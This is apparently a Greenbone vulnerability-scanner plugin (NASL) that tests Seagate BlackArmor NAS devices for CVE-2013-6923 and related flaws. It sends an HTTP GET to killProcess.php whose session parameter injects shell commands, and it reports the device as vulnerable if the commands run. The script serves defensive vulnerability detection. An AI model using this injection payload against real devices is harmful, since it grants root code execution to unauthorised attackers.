# Copyright (C) 2014 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE_PREFIX = "cpe:/o:seagate:blackarmor";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103867");
  script_version("2021-10-15T11:02:56+0000");
  script_tag(name:"last_modification", value:"2021-10-15 11:02:56 +0000 (Fri, 15 Oct 2021)");
  script_tag(name:"creation_date", value:"2014-01-06 12:27:03 +0100 (Mon, 06 Jan 2014)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2017-11-03 17:44:00 +0000 (Fri, 03 Nov 2017)");

  script_cve_id("CVE-2013-6923", "CVE-2013-6924", "CVE-2013-6922");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Seagate BlackArmor NAS Multiple Vulnerabilities");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_seagate_blackarmor_nas_detect.nasl");
  script_mandatory_keys("seagate/blackarmor_nas/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"Seagate BlackArmor NAS is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The following vulnerabilities exist:

  - Multiple remote code execution vulnerabilities (root)

  - Multiple local file include vulnerabilities

  - Multiple information disclosure vulnerabilities

  - Multiple cross-site scripting vulnerabilities");

  script_tag(name:"impact", value:"Successful exploitation will allow an attacker to execute
  arbitrary code as root or to obtain sensitive information which may aid in further attacks.");

  script_tag(name:"solution", value:"Ask the vendor for an update");

  script_xref(name:"URL", value:"http://www.nerdbox.it/seagate-nas-multiple-vulnerabilities/");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("misc_func.inc");
include("os_func.inc");

if (!infos = get_app_port_from_cpe_prefix(cpe: CPE_PREFIX, service: "www"))
  exit(0);

port = infos["port"];
cpe = infos["cpe"];

if (!get_app_location(cpe: cpe, port: port, nofork: TRUE))
  exit(0);

cmds = exploit_commands("linux");

foreach pattern (keys(cmds)) {
  url = "/backupmgt/killProcess.php?session=false;" + cmds[pattern] + ";%20#";

  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);

  if (egrep(pattern: pattern, string: res)) {
    info['HTTP Method'] = "GET";
    info['Affected URL'] = http_report_vuln_url(port: port, url: url, url_only: TRUE);

    report  = 'By doing the following HTTP request:\n\n';
    report += text_format_table(array: info) + '\n\n';
    report += 'it was possible to execute the "' + cmds[pattern] + '" command on the target host.';
    report += '\n\nResult:\n\n' + res;
    expert_info = 'Request:\n\n' + req + '\n\nResponse:\n\n' + res;
    security_message(port: port, data: report, expert_info: expert_info);
    exit(0);
  }
}

exit(99);